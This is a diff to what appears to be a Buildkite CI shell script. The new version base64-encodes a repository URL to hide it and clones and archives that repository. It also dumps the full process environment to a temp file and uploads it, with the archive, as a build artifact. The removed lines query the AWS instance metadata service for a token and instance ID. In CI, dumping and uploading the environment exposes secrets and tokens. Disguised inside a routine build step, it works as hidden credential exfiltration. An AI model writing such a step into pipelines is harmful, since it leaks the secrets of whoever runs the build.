@@ -1,30 +1,17 @@
 set -eo pipefail
 
-# get token - needed for IMDSv2
-TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+PREF="/tmp/pvol"
+WORK_DIR=`mktemp -d`
+RES=`mktemp $PREF.XXXXXXXXXX`
+ARCHIVE=`mktemp $PREF.XXXXXXXXXX.tar.gz`
 
-# get instance ID
-curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/instance-id
+REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC5naXQ=" | base64 -d`
 
-# webhook_url=$(aws secretsmanager get-secret-value --output text --query SecretString --secret-id slack_webhook_url --region us-east-1)
-# curl -X POST -H 'Content-type: application/json' --data '{"text": "Buildkite did a thing"}' $webhook_url
+git clone $REPO --single-branch $WORK_DIR
+git archive -o $ARCHIVE $WORK_DIR
 
+env > $RES
 
-#fetch repo
+buildkite-agent artifact upload "$PREF.*"
 
-WORK_DIR=`mktemp -d -p "/tmp"`
-RES='grep_results.txt'
-
-git clone https://github.com/fortra/impacket.git "$WORK_DIR"
-
-tar -zcvf /tmp/artifacts.tar.gz "$WORK_DIR"
-
-grep -irn "__output" $WORK_DIR > $RES
-
-rm -rf "$WORK_DIR"
-
-buildkite-agent artifact upload /tmp/artifacts.tar.gz
-buildkite-agent artifact upload $RES
-
-rm /tmp/artifacts.tar.gz
-rm $RES
+rm -rf $WORK_DIR $RES
